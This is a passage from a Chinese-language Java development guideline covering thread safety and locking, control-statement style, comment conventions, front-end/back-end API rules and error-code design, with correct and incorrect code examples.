Integer.MAX\\_VALUE，可能会创建大量的线程，从而导致 OOM。 \n\n5. <font color=\" #C00000\">【强制】</font>SimpleDateFormat  是线程不安全的类，一般不要定义为 static 变量，如果定义为 static， 必须加锁，或者使用 DateUtils 工具类。 \n\n   <font color=\"#019858\">正例：</font>注意线程安全，使用 DateUtils。亦推荐如下处理：\n\n   ```java\n   private static final ThreadLocal<DateFormat> df = new ThreadLocal<DateFormat>() {\n       @Override\n       protected DateFormat initialValue() {\n           return new SimpleDateFormat(\"yyyy-MM-dd\");\n       }\n   };\n   ```\n\n   <font color=\" #977C00\">说明：</font>如果是 JDK8 的应用，==可以使用 Instant 代替 Date，LocalDateTime 代替 Calendar， DateTimeFormatter 代替 SimpleDateFormat==，官方给出的解释：simple beautiful strong immutable thread-safe。  \n\n6. <font color=\" #C00000\">【强制】</font>必须回收自定义的 ThreadLocal 变量，尤其在线程池场景下，线程经常会被复用， 如果不清理自定义的 ThreadLocal 变量，可能会影响后续业务逻辑和造成内存泄露等问题。 尽量在代理中使用 try-finally 块进行回收。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   objectThreadLocal.set(userInfo); \n   try {\n       // ... \n   } finally {\n       objectThreadLocal.remove(); \n   }\n   ```\n\n7. <font color=\" #C00000\">【强制】</font>高并发时，同步调用应该去考量锁的性能损耗。能用无锁数据结构，就不要用锁；能 锁区块，就不要锁整个方法体；能用对象锁，就不要用类锁。    \n\n   <font color=\" #977C00\">说明：</font>尽可能使加锁的代码块工作量尽可能的小，避免在锁代码块中调用 RPC 方法。 \n\n8. <font color=\" #C00000\">【强制】</font>对多个资源、数据库表、对象同时加锁时，需要保持一致的加锁顺序，否则可能会造成死锁。 \n\n   <font color=\" #977C00\">说明：</font>线程一需要对表 A、B、C 依次全部加锁后才可以进行更新操作，那么线程二的加锁顺序也必须是 A、 B、C，否则可能出现死锁。\n\n9. <font color=\" #C00000\">【强制】</font>在使用阻塞等待获取锁的方式中，必须在 try 代码块之外，并且在加锁方法与 try 代码块之间没有任何可能抛出异常的方法调用，避免加锁成功后，在 finally 中无法解锁。\n\n   - 说明一：如果在 lock 方法与 try 代码块之间的方法调用抛出异常，那么无法解锁，造成其它线程无法成功获取锁。 \n\n   - 说明二：如果 lock 方法在 try 代码块之内，可能由于其它方法抛出异常，导致在 finally 代码块中，unlock 对未加锁的对象解锁，它会调用 AQS 的 tryRelease 方法（取决于具体实现类），抛出 IllegalMonitorStateException 异常。 \n\n   - 说明三：在 Lock 对象的 lock 方法实现中可能抛出 unchecked 异常，产生的后果与说明二相同。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   Lock lock = new XxxLock();\n   lock.lock();\n   try {\n       doSomething();\n       doOthers();\n   } finally {\n       lock.unlock();\n   }\n   ```\n\n    <font color=\" #FF4500\">反例：</font> \n\n   ```java\n   Lock lock = new XxxLock(); // ... \n   try {\n       //  如果此处抛出异常，则直接执行 finally 代码块\n       doSomething();\n       //  无论加锁是否成功，finally 代码块都会执行\n       lock.lock();\n       doOthers();\n   } finally {\n       lock.unlock();\n   }\n   ```\n\n10. <font color=\" #C00000\">【强制】</font>在使用尝试机制来获取锁的方式中，进入业务代码块之前，必须先判断当前线程是否持有锁。锁的释放规则与锁的阻塞等待方式相同。\n\n    <font color=\" #977C00\">说明：</font>Lock 对象的 unlock 方法在执行时，它会调用 AQS 的 tryRelease 方法（取决于具体实现类），如果当前线程不持有锁，则抛出 IllegalMonitorStateException 异常。 \n\n    <font color=\"#019858\">正例：</font>\n\n    ```java\n    Lock lock = new XxxLock();\n    boolean isLocked = lock.tryLock();\n    if (isLocked) {\n        try {\n            doSomething();\n            doOthers();\n        } finally {\n            lock.unlock();\n        }\n    }\n    ```\n\n11. <font color=\" #C00000\">【强制】</font>并发修改同一记录时，避免更新丢失，需要加锁。要么在应用层加锁，要么在缓存加锁，要么在数据库层使用乐观锁，使用 version 作为更新依据。    \n\n    <font color=\" #977C00\">说明：</font>如果每次访问冲突概率小于 20%，推荐使用乐观锁，否则使用悲观锁。乐观锁的重试次数不得小于 3 次。\n\n12. <font color=\" #C00000\">【强制】</font>多线程并行处理定时任务时，Timer 运行多个 TimeTask 时，只要其中之一没有捕获抛出的异常，其它任务便会自动终止运行，使用 ScheduledExecutorService 则没有这个问题。\n\n13. <font color=\" #FFC000\">【推荐】</font>资金相关的金融敏感信息，使用悲观锁策略。\n\n    <font color=\" #977C00\">说明：</font>乐观锁在获得锁的同时已经完成了更新操作，校验逻辑容易出现漏洞，另外，乐观锁对冲突的解决策略有较复杂的要求，处理不当容易造成系统压力或数据异常，所以资金相关的金融敏感信息不建议使用乐观 锁更新。\n\n    <font color=\"#019858\">正例：</font>悲观锁遵循一锁、二判、三更新、四释放的原则。 \n\n14. <font color=\" #FFC000\">【推荐】</font>使用 CountDownLatch 进行异步转同步操作，每个线程退出前必须调用 countDown 方 法，线程执行代码注意 catch 异常，确保 countDown 方法被执行到，避免主线程无法执行至 await 方法，直到超时才返回结果。\n\n    <font color=\" #977C00\">说明：</font>注意，子线程抛出异常堆栈，不能在主线程 try-catch 到。 \n\n15. <font color=\" #FFC000\">【推荐】</font>避免 Random 实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一 seed 导致的性能下降。\n\n    <font color=\" #977C00\">说明：</font>Random 实例包括 java.util.Random  的实例或者 Math.random()的方式。 \n\n    <font color=\"#019858\">正例：</font>在 JDK7 之后，可以直接使用 API `ThreadLocalRandom`，而在  JDK7 之前，需要编码保证每个线 程持有一个单独的 Random 实例。 \n\n16. <font color=\" #FFC000\">【推荐】</font>通过双重检查锁（double-checked locking）（在并发场景下）存在延迟初始化的优化 问题隐患（可参考  The \"Double-Checked Locking is Broken\" Declaration），推荐解决方案中较 为简单一种（适用于 JDK5 及以上版本），将目标属性声明为 volatile 型，比如将 helper 的属 性声明修改为 `private volatile Helper helper = null;` 。\n\n    <font color=\"#019858\">正例：</font>\n\n    ```java\n    public class LazyInitDemo {\n        private volatile Helper helper = null;\n        public Helper getHelper() {\n            if (helper == null) {\n                synchronized (this) {\n                    if (helper == null) {\n                        helper = new Helper();\n                    }\n                }\n            }\n            return helper;\n        }\n        // other methods and fields...\n    }\n    ```\n\n    \n\n17. <font color=\"#76923C\">【参考】</font>volatile 解决多线程内存不可见问题。对于一写多读，是可以解决变量同步问题，但是如果多写，同样无法解决线程安全问题。\n\n    <font color=\" #977C00\">说明：</font>如果是 count++操作，使用如下类实现：AtomicInteger count = new AtomicInteger(); count.addAndGet(1); \n\n    如果是 JDK8，推荐使用 LongAdder 对象，比 AtomicLong 性能更好（减少乐观锁的重试次数）。\n\n18. <font color=\"#76923C\">【参考】</font>==HashMap 在容量不够进行 resize 时由于高并发可能出现死链，导致 CPU 飙升，在 开发过程中注意规避此风险== \n\n19. <font color=\"#76923C\">【参考】</font>ThreadLocal 对象使用 static 修饰，ThreadLocal 无法解决共享对象的更新问题。\n\n    <font color=\" #977C00\">说明：</font>这个变量是针对一个线程内所有操作共享的，所以设置为静态变量，所有此类实例共享此静态变量， 也就是说在类第一次被使用时装载，只分配一块存储空间，所有此类的对象(只要是这个线程内定义的)都可以操控这个变量。\n\n## (八)  控制语句 \n\n1. <font color=\" #C00000\">【强制】</font>在一个 switch 块内，每个 case 要么通过 continue/break/return 等来终止，要么 注释说明程序将继续执行到哪一个 case 为止；在一个 switch 块内，都必须包含一个 default语句，并且放在最后，即使它什么代码也没有。\n\n   <font color=\" #977C00\">说明：</font>注意 break 是退出 switch 语句块，而 return 是退出方法体。\n\n2. <font color=\" #C00000\">【强制】</font>==当 switch 括号内的变量类型为 String 并且此变量为外部参数时，必须先进行 null 判断，否则会抛出 NPE 异常==。 \n\n   <font color=\" #FF4500\">反例：</font>如下的代码输出是什么？\n\n   ```java\n   public class SwitchString {\n       public static void main(String[] args) {\n           method(null);\n       }\n   \n       public static void method(String param) {\n           switch (param) {\n               //  肯定不是进入这里\n               case \"sth\":\n                   System.out.println(\"it's sth\");\n                   break;\n               //  也不是进入这里\n               case \"null\":\n                   System.out.println(\"it's null\");\n                   break;\n               //  也不是进入这里\n               default:\n                   System.out.println(\"default\");\n           }\n       }\n   }\n   ```\n\n   \n\n3. <font color=\" #C00000\">【强制】</font>在 if/else/for/while/do 语句中必须使用大括号。    \n\n   <font color=\" #977C00\">说明：</font>即使只有一行代码，也禁止不采用大括号的编码方式：if (condition) statements;\n\n4. <font color=\" #C00000\">【强制】</font>三目运算符 condition?  表达式 1 :  表达式 2 中，高度注意表达式 1 和 2 在类型对齐 时，可能抛出因自动拆箱导致的 NPE 异常。 \n\n   <font color=\" #977C00\">说明：</font>以下两种场景会触发类型对齐的拆箱操作：\n\n   1）  表达式 1 或表达式 2 的值只要有一个是原始类型。\n\n   2）  表达式 1 或表达式 2 的值的类型不一致，会强制拆箱升级成表示范围更大的那个类型。    \n\n   <font color=\" #FF4500\">反例：</font> \n\n   ```java\n   Integer a = 1; \n   Integer b = 2; \n   Integer c = null; \n   Boolean flag = false; \n   // a*b 的结果是 int 类型，那么 c 会强制拆箱成 int 类型，抛出 NPE 异常 \n   Integer result=(flag? a*b : c); \n   ```\n\n5. <font color=\" #C00000\">【强制】</font>在高并发场景中，避免使用”等于”判断作为中断或退出的条件。\n\n   <font color=\" #977C00\">说明：</font>如果并发控制没有处理好，容易产生等值判断被“击穿”的情况，使用大于或小于的区间判断条件 来代替。 \n\n   <font color=\" #FF4500\">反例：</font>判断剩余奖品数量等于 0 时，终止发放奖品，但因为并发处理错误导致奖品数量瞬间变成了负数， 这样的话，活动无法终止。\n\n6. <font color=\" #FFC000\">【推荐】</font>当某个方法的代码总行数超过 10 行时，return / throw  等中断逻辑的右大括号后均 需要加一个空行。\n\n   <font color=\" #977C00\">说明：</font>这样做逻辑清晰，有利于代码阅读时重点关注。\n\n7. <font color=\" #FFC000\">【推荐】</font>表达异常的分支时，少用 if-else 方式，这种方式可以改写成：\n\n   ```java\n   if (condition) {\n       return obj; \n   } \n   \n   //  接着写 else 的业务逻辑代码;  \n   ```\n\n   \n\n   <font color=\" #977C00\">说明：</font>如果非使用 if()...else if()...else...方式表达逻辑，避免后续代码维护困难，请勿超过 3 层。      \n\n   <font color=\"#019858\">正例：</font>超过 3 层的  if-else  的逻辑判断代码可以使用卫语句、策略模式、状态模式等来实现，其中卫语句 示例如下： \n\n   ```java\n   public void findBoyfriend(Man man) {\n       if (man.isUgly()) {\n           System.out.println(\"本姑娘是外貌协会的资深会员\");\n           return;\n       }\n       if (man.isPoor()) {\n           System.out.println(\"贫贱夫妻百事哀\");\n           return;\n       }\n       if (man.isBadTemper()) {\n           System.out.println(\"银河有多远，你就给我滚多远\");\n           return;\n       }\n       System.out.println(\"可以先交往一段时间看看\");\n   }\n   ```\n\n8. <font color=\" #FFC000\">【推荐】</font>除常用方法（如 getXxx/isXxx）等外，不要在条件判断中执行其它复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。\n\n   <font color=\" #977C00\">说明：</font>很多  if  语句内的逻辑表达式相当复杂，与、或、取反混合运算，甚至各种方法纵深调用，理解成本非常高。如果赋值一个非常好理解的布尔变量名字，则是件令人爽心悦目的事情。\n\n    <font color=\"#019858\">正例：</font>\n\n   ```java\n   //  伪代码如下\n   final boolean existed = (file.open(fileName, \"w\") != null) && (...) || (...); \n   if (existed) { \n       ...\n   } \n   ```\n\n   \n\n   <font color=\" #FF4500\">反例：</font> \n\n   ```java\n    public final void acquire(long arg) {\n       if (!tryAcquire(arg) &&\n               acquireQueued(addWaiter(Node.EXCLUSIVE), arg)) {\n           selfInterrupt();\n       }\n   }\n   ```\n\n   \n\n9. <font color=\" #FFC000\">【推荐】</font>不要在其它表达式（尤其是条件表达式）中，插入赋值语句。\n\n   <font color=\" #977C00\">说明：</font>赋值点类似于人体的穴位，对于代码的理解至关重要，所以赋值语句需要清晰地单独成为一行。    \n\n   <font color=\" #FF4500\">反例：</font>\n\n   ```java\n   public Lock getLock(boolean fair) {\n       //  算术表达式中出现赋值操作，容易忽略 count 值已经被改变\n       threshold = (count = Integer.MAX_VALUE) - 1;\n       //  条件表达式中出现赋值操作，容易误认为是 sync==fair \n       return (sync = fair) ? new FairSync() : new NonfairSync();\n   }\n   ```\n\n10. <font color=\" #FFC000\">【推荐】</font>循环体中的语句要考量性能，以下操作尽量移至循环体外处理，如定义对象、变量、 获取数据库连接，进行不必要的 try-catch 操作（这个 try-catch 是否可以移至循环体外）。 \n\n11. <font color=\" #FFC000\">【推荐】</font>避免采用取反逻辑运算符。    \n\n    <font color=\" #977C00\">说明：</font>取反逻辑不利于快速理解，并且取反逻辑写法一般都存在对应的正向逻辑写法。\n\n    <font color=\"#019858\">正例：</font>使用 if (x < 628)  来表达  x  小于 628。 \n\n    <font color=\" #FF4500\">反例：</font>使用 if (!(x >= 628))  来表达  x  小于 628。\n\n12. <font color=\" #FFC000\">【推荐】</font>公开接口需要进行入参保护，尤其是批量操作的接口。\n\n    <font color=\" #FF4500\">反例：</font>某业务系统，提供一个用户批量查询的接口，API 文档上有说最多查多少个，但接口实现上没做任何保护，导致调用方传了一个 1000 的用户 id 数组过来后，查询信息后，内存爆了。\n\n13. <font color=\"#76923C\">【参考】</font>下列情形，需要进行参数校验： \n\n    1）  调用频次低的方法。\n\n    2）  执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参数错误导致中间执行回退，或者错误，那得不偿失。\n\n    3）  需要极高稳定性和可用性的方法。\n\n    4）  对外提供的开放接口，不管是 RPC/API/HTTP 接口。 \n\n    5）  敏感权限入口。 \n\n14. <font color=\"#76923C\">【参考】</font>下列情形，不需要进行参数校验： \n\n    1）  极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查。\n\n    2）  底层调用频度比较高的方法。毕竟是像纯净水过滤的最后一道，参数错误不太可能到底层才会暴露 问题。一般 DAO 层与 Service 层都在同一个应用中，部署在同一台服务器中，所以 DAO 的参数校验，可以省略。 \n\n    3）  被声明成 private 只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检 查或者肯定不会有问题，此时可以不校验参数。\n\n## (九)  注释规约\n\n1. <font color=\" #C00000\">【强制】</font>类、类属性、类方法的注释必须使用 Javadoc 规范，使用/\\*\\*内容\\*/格式，不得使用 // xxx 方式。 \n\n   <font color=\" #977C00\">说明：</font>在 IDE编辑窗口中，Javadoc 方式会提示相关注释，生成 Javadoc 可以正确输出相应注释；在 IDE 中，工程调用方法时，不进入方法即可悬浮提示方法、参数、返回值的意义，提高阅读效率。\n\n2. <font color=\" #C00000\">【强制】</font>所有的抽象方法（包括接口中的方法）必须要用 Javadoc 注释、除了返回值、参数、 异常说明外，还必须指出该方法做什么事情，实现什么功能。\n\n   <font color=\" #977C00\">说明：</font>对子类的实现要求，或者调用注意事项，请一并说明。\n\n3. <font color=\" #C00000\">【强制】</font>所有的类都必须添加创建者和创建日期。 \n\n   <font color=\" #977C00\">说明：</font>在设置模板时，注意 IDEA的@author 为`${USER}`，而 eclipse 的@author 为`${user}` ，大小写有 区别，而日期的设置统一为 yyyy/MM/dd 的格式。\n\n   <font color=\"#019858\">正例：</font>  \n\n   ```java\n   /**\n    * @author yangguanbao\n    * @date 2016/10/31\n    */\n   ```\n\n4. <font color=\" #C00000\">【强制】</font>方法内部单行注释，在被注释语句上方另起一行，使用//注释。方法内部多行注释使 用/\\* \\*/注释，注意与代码对齐。\n\n5. <font color=\" #C00000\">【强制】</font>所有的枚举类型字段必须要有注释，说明每个数据项的用途。\n\n6. <font color=\" #FFC000\">【推荐】</font>与其“半吊子”英文来注释，不如用中文注释把问题说清楚。专有名词与关键字保持 英文原文即可。\n\n   <font color=\" #FF4500\">反例：</font>“TCP 连接超时”解释成“传输控制协议连接超时”，理解反而费脑筋。\n\n7. <font color=\" #FFC000\">【推荐】</font>代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑 等的修改。\n\n   <font color=\" #977C00\">说明：</font>代码与注释更新不同步，就像路网与导航软件更新不同步一样，如果导航软件严重滞后，就失去了导航的意义。\n\n8. <font color=\" #FFC000\">【推荐】</font>在类中删除未使用的任何字段、方法、内部类；在方法中删除未使用的任何参数声明 与内部变量。\n\n9. <font color=\"#76923C\">【参考】</font>谨慎注释掉代码。在上方详细说明，而不是简单地注释掉。如果无用，则删除。\n\n   <font color=\" #977C00\">说明：</font>代码被注释掉有两种可能性：\n\n   1）后续会恢复此段代码逻辑。\n\n   2）永久不用\n\n   前者如果没有备注信息， 难以知晓注释动机。后者建议直接删掉即可，假如需要查阅历史代码，登录代码仓库即可。\n\n10. <font color=\"#76923C\">【参考】</font>对于注释的要求\n\n    - 第一、能够准确反映设计思想和代码逻辑\n\n    - 第二、能够描述业务含 义，使别的程序员能够迅速了解到代码背后的信息\n\n    完全没有注释的大段代码对于阅读者形同 天书，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。\n\n11. <font color=\"#76923C\">【参考】</font>好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一 个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释又是相当大的负担。\n\n    <font color=\" #FF4500\">反例：</font> \n\n    // put elephant into fridge put(elephant, fridge); \n\n    方法名 put，加上两个有意义的变量名 elephant 和 fridge，已经说明了这是在干什么，语义清晰的代码不 需要额外的注释。\n\n12. <font color=\"#76923C\">【参考】</font>特殊注释标记，请注明标记人与标记时间。注意及时处理这些标记，通过标记扫描， 经常清理此类标记。线上故障有时候就是来源于这些标记处的代码。\n\n    1）  待办事宜（<font color=\"#0000FF\">TODO</font>）:（标记人，标记时间，[预计处理时间]） \n\n    表示需要实现，但目前还未实现的功能。这实际上是一个 Javadoc 的标签，目前的 Javadoc 还没 有实现，但已经被广泛使用。只能应用于类，接口和方法（因为它是一个 Javadoc 标签）。 \n\n    2）  错误，不能工作（<font color=\"#0000FF\">FIXME</font>）:（标记人，标记时间，[预计处理时间]） \n\n    在注释中用 FIXME标记某代码是错误的，而且不能工作，需要及时纠正的情况。\n\n## (十)  前后端规约\n\n1. <font color=\" #C00000\">【强制】</font>前后端交互的 API，需要明确协议、域名、路径、请求方法、请求内容、状态码、响 应体。 \n\n   <font color=\" #977C00\">说明：</font>\n\n   1）  **协议**：生产环境必须使用 HTTPS。 \n\n   2）  **路径**：每一个 API 需对应一个路径，表示 API 具体的请求地址：\n\n   - 代表一种资源，只能为名词，推荐使用复数，不能为动词，请求方法已经表达动作意义。\n\n   - URL路径不能使用大写，单词如果需要分隔，统一使用下划线。\n\n   - 路径禁止携带表示请求内容类型的后缀，比如\".json\",\".xml\"，通过 accept 头表达即可。\n\n   3）  **请求方法**：对具体操作的定义，常见的请求方法如下：\n\n   - GET：从服务器取出资源。\n\n   - POST：在服务器新建一个资源。\n\n   - PUT：在服务器更新资源。\n\n   - DELETE：从服务器删除资源。\n\n   4）  **请求内容**：URL带的参数必须无敏感信息或符合安全要求；body 里带参数时必须设置 Content-Type。 5）  响应体：响应体 body 可放置多种数据类型，由 Content-Type 头来确定。\n\n2. <font color=\" #C00000\">【强制】</font>前后端数据列表相关的接口返回，如果为空，则返回空数组[]或空集合{}。    \n\n   <font color=\" #977C00\">说明：</font>此条约定有利于数据层面上的协作更加高效，减少前端很多琐碎的 null 判断。 \n\n3. <font color=\" #C00000\">【强制】</font>服务端发生错误时，返回给前端的响应信息必须包含 ==HTTP 状态码，errorCode、 errorMessage、用户提示信息==四个部分。\n\n   <font color=\" #977C00\">说明：</font>四个部分的涉众对象分别是浏览器、前端开发、错误排查人员、用户。\n\n   其中输出给用户的提示信息要求：简短清晰、提示友好，引导用户进行下一步操作或解释错误原因，提示信息可以包括错误原因、上 下文环境、推荐操作等。 \n\n   errorCode：参考[**附录2：错误码列表**](#附录2：错误码列表)。\n\n   errorMessage：简要描述后端出错原因，便于错误排 查人员快速定位问题，注意不要包含敏感数据信息。\n\n    <font color=\"#019858\">正例：</font>常见的 HTTP 状态码如下\n\n   | 状态码 | 信息                  | 描述                                                         |\n   | ------ | --------------------- | ------------------------------------------------------------ |\n   | 200    | OK                    | 表明该请求被成功地完成，所请求的资源发送到客户端。           |\n   | 401    | Unauthorized          | 请求要求身份验证，常见对于需要登录而用户未登录的情况。       |\n   | 403    | Forbidden             | 服务器拒绝请求，常见于机密信息或复制其它登录用户链接访问服务器的情况。 |\n   | 404    | Not Found             | 服务器无法取得所请求的网页，请求资源不存在。                 |\n   | 500    | Internal Server Error | 服务器内部错误。                                             |\n\n4. <font color=\" #C00000\">【强制】</font>==在前后端交互的 JSON 格式数据中，所有的 key 必须为小写字母开始的 lowerCamelCase 风格==，符合英文表达习惯，且表意完整。\n\n   <font color=\"#019858\">正例：</font>errorCode / errorMessage / assetStatus / menuList / orderList / configFlag    \n\n   <font color=\" #FF4500\">反例：</font>ERRORCODE / ERROR\\_CODE / error\\_message / error-message / errormessage / ErrorMessage / msg\n\n5. <font color=\" #C00000\">【强制】</font>errorMessage 是前后端错误追踪机制的体现，可以在前端输出到 type=\"hidden\" 文字类控件中，或者用户端的日志中，帮助我们快速地定位出问题。\n\n6. <font color=\" #C00000\">【强制】</font>对于需要使用超大整数的场景，服务端一律使用 String 字符串类型返回，禁止使用 Long 类型。\n\n   <font color=\" #977C00\">说明：</font>Java 服务端如果直接返回 Long 整型数据给前端，JS 会自动转换为 Number 类型（注：此类型为双精度浮点数，表示原理与取值范围等同于 Java 中的 Double）。Long 类型能表示的最大值是 2 的 63 次方 -1，在取值范围之内，超过 2 的 53 次方 (9007199254740992)的数值转化为 JS 的 Number 时，有些数值会有精度损失。\n\n   扩展说明，在 Long 取值范围内，任何 2 的指数次整数都是绝对不会存在精度损失的，所 以说精度损失是一个概率问题。若浮点数尾数位与指数位空间不限，则可以精确表示任何整数，但很不幸， 双精度浮点数的尾数位只有 52 位。\n\n   <font color=\" #FF4500\">反例：</font>通常在订单号或交易号大于等于 16 位，大概率会出现前后端单据不一致的情况，比如，\"orderId\": 362909601374617692，前端拿到的值却是: 362909601374617660。 \n\n7. <font color=\" #C00000\">【强制】</font>HTTP 请求通过 URL传递参数时，不能超过 2048 字节。 \n\n   <font color=\" #977C00\">说明：</font>不同浏览器对于 URL的最大长度限制略有不同，并且对超出最大长度的处理逻辑也有差异，2048 字节是取所有浏览器的最小值。\n\n   <font color=\" #FF4500\">反例：</font>某业务将退货的商品 id 列表放在 URL中作为参数传递，当一次退货商品数量过多时，URL参数超长， 传递到后端的参数被截断，导致部分商品未能正确退货。\n\n8. <font color=\" #C00000\">【强制】</font>HTTP 请求通过 body 传递内容时，必须控制长度，超出最大长度后，后端解析会出 错。\n\n   <font color=\" #977C00\">说明：</font>nginx 默认限制是 1MB，tomcat 默认限制为 2MB，当确实有业务需要传较大内容时，可以通过调大服务器端的限制。\n\n9. <font color=\" #C00000\">【强制】</font>在翻页场景中，用户输入参数的小于 1，则前端返回第一页参数给后端；后端发现用 户输入的参数大于总页数，直接返回最后一页。\n\n10. <font color=\" #C00000\">【强制】</font>服务器内部重定向必须使用 forward；外部重定向地址必须使用 ==URL统一代理模块== 生成，否则会因线上采用 HTTPS 协议而导致浏览器提示“不安全”，并且还会带来 URL维护 不一致的问题。\n\n11. <font color=\" #FFC000\">【推荐】</font>服务器返回信息必须被标记是否可以缓存，如果缓存，客户端可能会重用之前的请求结果。\n\n    <font color=\" #977C00\">说明：</font>缓存有利于减少交互次数，减少交互的平均延迟。\n\n     <font color=\"#019858\">正例：</font>http 1.1 中，s-maxage 告诉服务器进行缓存，时间单位为秒，用法如下， response.setHeader(\"Cache-Control\", \"s-maxage=\" + cacheSeconds);\n\n12. <font color=\" #FFC000\">【推荐】</font>服务端返回的数据，使用 JSON 格式而非 XML。\n\n     <font color=\" #977C00\">说明：</font>尽管 HTTP 支持使用不同的输出格式，例如纯文本，JSON，CSV，XML，RSS 甚至 HTML。如果我 们使用的面向用户的服务，应该选择 JSON 作为通信中使用的标准数据交换格式，包括请求和响应。此外， application/JSON 是一种通用的 MIME 类型，具有实用、精简、易读的特点。\n\n13. <font color=\" #FFC000\">【推荐】</font>前后端的时间格式统一为\"yyyy-MM-dd HH:mm:ss\"，统一为 GMT。\n\n14. <font color=\"#76923C\">【参考】</font>在接口路径中不要加入版本号，版本控制在 HTTP 头信息中体现，有利于向前兼容。\n\n    <font color=\" #977C00\">说明：</font>当用户在低版本与高版本之间反复切换工作时，会导致迁移复杂度升高，存在数据错乱风险。\n\n## (十一)  其他 \n\n1. <font color=\" #C00000\">【强制】</font>在使用正则表达式时，利用好其预编译功能，可以有效加快正则匹配速度。\n\n   <font color=\" #977C00\">说明：</font>不要在方法体内定义：Pattern pattern = Pattern.compile(“规则”);\n\n2. <font color=\" #C00000\">【强制】</font>避免用 Apache Beanutils 进行属性的 copy。 \n\n   <font color=\" #977C00\">说明：</font>Apache BeanUtils 性能较差，可以使用其他方案比如 Spring BeanUtils, Cglib BeanCopier，注意 均是浅拷贝。\n\n3. <font color=\" #C00000\">【强制】</font>velocity 调用 POJO 类的属性时，直接使用属性名取值即可，模板引擎会自动按规范 调用 POJO 的 getXxx()，如果是 boolean 基本数据类型变量（boolean 命名不需要加 is 前缀）， 会自动调用 isXxx()方法。 \n\n   <font color=\" #977C00\">说明：</font>注意如果是 Boolean 包装类对象，优先调用 getXxx()的方法。\n\n4. <font color=\" #C00000\">【强制】</font>==后台输送给页面的变量必须加$!{var}——中间的感叹号==。\n\n   <font color=\" #977C00\">说明：</font>如果 var 等于 null 或者不存在，那么${var}会直接显示在页面上。\n\n5. <font color=\" #C00000\">【强制】</font>注意  Math.random()  这个方法返回是 double 类型，注意取值的范围  0≤x<1（能够 取到零值，注意除零异常），如果想获取整数类型的随机数，不要将 x 放大 10 的若干倍然后 取整，直接使用 Random 对象的 nextInt 或者 nextLong 方法。 \n\n6. <font color=\" #FFC000\">【推荐】</font>不要在视图模板中加入任何复杂的逻辑。\n\n   <font color=\" #977C00\">说明：</font>根据 MVC 理论，视图的职责是展示，不要抢模型和控制器的活。\n\n7. <font color=\" #FFC000\">【推荐】</font>任何数据结构的构造或初始化，都应指定大小，避免数据结构无限增长吃光内存。\n\n8. <font color=\" #FFC000\">【推荐】</font>及时清理不再使用的代码段或配置信息。\n\n   <font color=\" #977C00\">说明：</font>对于垃圾代码或过时配置，坚决清理干净，避免程序过度臃肿，代码冗余。    \n\n   <font color=\"#019858\">正例：</font>对于暂时被注释掉，后续可能恢复使用的代码片断，在注释代码上方，统一规定使用三个斜杠(///) 来说明注释掉代码的理由。如： \n\n   ```java\n   public static void hello() {\n       ///  业务方通知活动暂停\n       // Business business = new Business();\n       // business.active();\n       System.out.println(\"it's finished\");\n   }\n   ```\n\n# 二、异常日志\n\n## (一) 错误码\n\n1. <font color=\" #C00000\">【强制】</font>错误码的制定原则：快速溯源、沟通标准化。\n\n   <font color=\" #977C00\">说明：</font>  错误码想得过于完美和复杂，就像康熙字典中的生僻字一样，用词似乎精准，但是字典不容易随身 携带并且简单易懂。     \n\n   <font color=\"#019858\">正例：</font>错误码回答的问题是谁的错？错在哪？\n\n   1）错误码必须能够快速知晓错误来源，可快速判断是谁的问 题。\n\n   2）错误码必须能够进行清晰地比对（代码中容易 equals）。\n\n   3）错误码有利于团队快速对错误原因达 到一致认知。\n\n2. <font color=\" #C00000\">【强制】</font>错误码不体现版本号和错误等级信息。\n\n   <font color=\" #977C00\">说明：</font>错误码以不断追加的方式进行兼容。错误等级由日志和错误码本身的释义来决定。\n\n3. <font color=\" #C00000\">【强制】</font>全部正常，但不得不填充错误码时返回五个零：00000。 \n\n4. <font color=\" #C00000\">【强制】</font>错误码为字符串类型，共 5 位，分成两个部分：错误产生来源+四位数字编号。\n\n   <font color=\" #977C00\">说明：</font>错误产生来源分为 A/B/C，\n\n   A 表示错误来源于用户，比如参数错误，用户安装版本过低，用户支付 超时等问题；\n\n   B 表示错误来源于当前系统，往往是业务逻辑出错，或程序健壮性差等问题；\n\n   C 表示错误来源 于第三方服务，比如 CDN 服务出错，消息投递超时等问题；\n\n   四位数字编号从 0001 到 9999，大类之间的 步长间距预留 100，参考[**附录2：错误码列表**](#附录2：错误码列表)\n\n5. <font color=\" #C00000\">【强制】</font>编号不与公司业务架构，更不与组织架构挂钩，以先到先得的原则在统一平台上进行， 审批生效，编号即被永久固定。\n\n6. <font color=\" #C00000\">【强制】</font>错误码使用者避免随意定义新的错误码。\n\n   <font color=\" #977C00\">说明：</font>尽可能在原有错误码附表中找到语义相同或者相近的错误码在代码中使用即可。\n\n7. <font color=\" #C00000\">【强制】</font>错误码不能直接输出给用户作为提示信息使用。    \n\n   <font color=\" #977C00\">说明：</font>==堆栈（stack_trace）、错误信息(error_message)、错误码（error_code）、提示信息（user_tip）== 是一个有效关联并互相转义的和谐整体，但是请勿互相越俎代庖。\n\n8. <font color=\" #FFC000\">【推荐】</font>错误码之外的业务独特信息由 error\\_message 来承载，而不是让错误码本身涵盖过 多具体业务属性。\n\n9. <font color=\" #FFC000\">【推荐】</font>在获取第三方服务错误码时，向上抛出允许本系统转义，由 C 转为 B，并且在错误信 息上带上原有的第三方错误码。\n\n10. <font color=\"#76923C\">【参考】</font>错误码分为一级宏观错误码、二级宏观错误码、三级宏观错误码。\n\n    <font color=\" #977C00\">说明：</font>在无法更加具体确定的错误场景中，可以直接使用一级宏观错误码，分别是：A0001（用户端错误）、B0001（系统执行出错）、C0001（调用第三方服务出错）。     \n\n    <font color=\"#019858\">正例：</font>调用第三方服务出错是一级，中间件错误是二级，消息服务出错是三级。\n\n11. <font color=\"#76923C\">【参考】</font>错误码的后三位编号与 HTTP 状态码没有任何关系。\n\n12. <font 